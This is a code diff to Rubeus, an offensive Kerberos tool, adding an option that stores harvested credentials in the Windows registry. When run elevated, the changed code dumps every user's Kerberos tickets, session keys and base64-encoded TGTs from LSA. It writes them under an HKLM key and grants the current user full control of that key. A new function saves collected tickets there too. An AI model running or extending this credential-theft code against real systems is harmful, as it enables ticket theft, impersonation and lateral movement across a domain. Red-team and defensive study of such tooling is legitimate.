@@ -4,6 +4,10 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using System.Security;
+using System.Reflection;
+using System.Security.AccessControl;
+using Microsoft.Win32;
 
 namespace Rubeus
 {
@@ -304,24 +308,28 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "", bool monitor = false)
+        public static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "", bool monitor = false, string registryBasePath = null)
         {
             // lists 
             if (Helpers.IsHighIntegrity())
             {
-                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor);
+                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor, false, registryBasePath);
             }
             else
             {
+                if (registryBasePath != null)
+                {
+                    Console.WriteLine("[X] Registry option was passed but will not be used, as we require elevated rights to write to HKLM.");
+                }
                 ListKerberosTicketDataCurrentUser(targetService);
             }
         }
 
-        public static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false)
+        public static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false, string registryBasePath = null)
         {
             // extracts Kerberos ticket data for all users on the system (assuming elevation)
 
-            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
+            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSAG
             //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
             //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
             //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
@@ -331,9 +339,42 @@ namespace Rubeus
             // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
             // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
 
+            Microsoft.Win32.RegistryKey baseKey = null;
+            Microsoft.Win32.RegistryKey userData = null;
+            string user = null;
             if (!monitor)
             {
                 Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
+            }
+            else
+            {
+                try
+                {
+                    if (Environment.UserName == "SYSTEM")
+                    {
+                        user = "NT AUTHORITY\\SYSTEM";
+                    }
+                    else
+                    {
+                        user = Environment.UserDomainName + "\\" + Environment.UserName;
+                    };
+
+                    Registry.LocalMachine.CreateSubKey(registryBasePath);
+                    baseKey = Registry.LocalMachine.OpenSubKey(registryBasePath, RegistryKeyPermissionCheck.ReadWriteSubTree);
+                    RegistrySecurity rs = baseKey.GetAccessControl();
+                    RegistryAccessRule rar = new RegistryAccessRule(
+                        user,
+                        RegistryRights.FullControl,
+                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
+                        PropagationFlags.None,
+                        AccessControlType.Allow);
+                    rs.AddAccessRule(rar);
+                    baseKey.SetAccessControl(rs);
+                }
+                catch (UnauthorizedAccessException ex)
+                {
+                    Console.WriteLine("[-] Error setting access control registry key: {0}", ex);
+                }
             }
 
             if (targetLuid != 0)
@@ -448,6 +489,21 @@ namespace Rubeus
 
                                 if (count2 != 0)
                                 {
+                                    if (baseKey != null)
+                                    {
+                                        baseKey.CreateSubKey(username + "@" + domain);
+                                        userData = baseKey.OpenSubKey(username + "@" + domain, RegistryKeyPermissionCheck.ReadWriteSubTree);
+                                        userData.SetValue("Username", username);
+                                        userData.SetValue("Domain", domain);
+                                        userData.SetValue("LoginId", data.LoginID.LowPart.ToString());
+                                        userData.SetValue("UserSID", sid.Value.ToString());
+                                        userData.SetValue("AuthenticationPackage", authpackage.ToString());
+                                        userData.SetValue("LogonType", logonType.ToString());
+                                        userData.SetValue("LogonTime", logonTime.ToString());
+                                        userData.SetValue("LogonServer", logonServer.ToString());
+                                        userData.SetValue("LogonServerDNSDomain", dnsDomainName.ToString());
+                                        userData.SetValue("UserPrincipalName", upn.ToString());
+                                    }
                                     Console.WriteLine("\r\n  UserName                 : {0}", username);
                                     Console.WriteLine("  Domain                   : {0}", domain);
                                     Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
@@ -613,6 +669,25 @@ namespace Rubeus
                                                 byte[] encodedTicket = new byte[encodedTicketSize];
                                                 Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                                                 string base64TGT = Convert.ToBase64String(encodedTicket);
+                                                if (userData != null)
+                                                {
+                                                    userData.SetValue("ServiceName", serviceName);
+                                                    userData.SetValue("TargetName", targetName);
+                                                    userData.SetValue("ClientName", clientName);
+                                                    userData.SetValue("DomainName", domainName);
+                                                    userData.SetValue("TargetDomainName", targetDomainName);
+                                                    userData.SetValue("AltTargetDomainName", altTargetDomainName);
+                                                    userData.SetValue("SessionKeyType", sessionKeyType);
+                                                    userData.SetValue("Base64SessionKey", base64SessionKey);
+                                                    userData.SetValue("KeyExpirationTime", keyExpirationTime);
+                                                    userData.SetValue("TicketFlags", ticketFlags);
+                                                    userData.SetValue("StartTime", startTime);
+                                                    userData.SetValue("EndTime", endTime);
+                                                    userData.SetValue("RenewUntil", renewUntil);
+                                                    userData.SetValue("TimeSkew", timeSkew);
+                                                    userData.SetValue("EncodedTicketSize", encodedTicketSize);
+                                                    userData.SetValue("Base64EncodedTicket", base64TGT);
+                                                }
 
                                                 Console.WriteLine("    ServiceName              : {0}", serviceName);
                                                 Console.WriteLine("    TargetName               : {0}", targetName);
@@ -630,6 +705,7 @@ namespace Rubeus
                                                 Console.WriteLine("    TimeSkew                 : {0}", timeSkew);
                                                 Console.WriteLine("    EncodedTicketSize        : {0}", encodedTicketSize);
                                                 Console.WriteLine("    Base64EncodedTicket      :\r\n");
+                                                
                                                 // display the TGT, columns of 100 chararacters
                                                 foreach (string line in Helpers.Split(base64TGT, 100))
                                                 {
@@ -1208,6 +1284,53 @@ namespace Rubeus
                 }
                 Console.WriteLine("\r\n");
             }
+        }
+
+        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)
+        {
+            string user = null;
+            if (Environment.UserName == "SYSTEM")
+            {
+                user = "NT AUTHORITY\\SYSTEM";
+            }
+            else
+            {
+                user = Environment.UserDomainName + "\\" + Environment.UserName;
+            };
+
+            Registry.LocalMachine.CreateSubKey(baseRegistryKey);
+            RegistryKey basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);
+            RegistrySecurity rs = basePath.GetAccessControl();
+            RegistryAccessRule rar = new RegistryAccessRule(
+                user,
+                RegistryRights.FullControl,
+                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
+                PropagationFlags.None,
+                AccessControlType.Allow);
+            rs.AddAccessRule(rar);
+            basePath.SetAccessControl(rs);
+
+            foreach (KRB_CRED cred in creds)
+            {
+                string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
+                string domainName = cred.enc_part.ticket_info[0].prealm;
+                DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
+                DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
+                DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
+                Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
+                string base64TGT = Convert.ToBase64String(cred.Encode().Encode());
+
+                Microsoft.Win32.RegistryKey userData = basePath.CreateSubKey(userName + "@" + domainName);
+
+                // Create the keys underneath this
+                userData.SetValue("Username", domainName + "\\" + userName);
+                userData.SetValue("StartTime", startTime);
+                userData.SetValue("EndTime", endTime);
+                userData.SetValue("RenewTill", renewTill);
+                userData.SetValue("Flags", flags);
+                userData.SetValue("Base64EncodedTicket", base64TGT);
+            }
+            Console.WriteLine("\r\n[*] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
         }
 
         public static void DisplayTicket(KRB_CRED cred)
